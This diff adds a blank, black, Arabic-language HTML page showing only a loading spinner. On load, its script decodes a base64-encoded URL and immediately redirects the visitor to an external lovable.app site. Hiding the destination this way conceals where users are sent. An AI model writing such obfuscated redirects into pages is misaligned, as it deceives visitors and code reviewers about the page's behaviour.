@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+  <style>
+    html, body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      background: #000;
+      overflow: hidden;
+    }
+    .loader {
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      width: 42px;
+      height: 42px;
+      margin: -21px 0 0 -21px;
+      border: 4px solid rgba(255,255,255,.18);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .55s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+  <script>
+    (function () {
+      var u = atob('aHR0cHM6Ly92MC1tb2Jhc2hlci5sb3ZhYmxlLmFwcC8=');
+      location.replace(u);
+    })();
+  </script>
+</head>
+<body>
+  <div class="loader"></div>
+</body>
+</html>
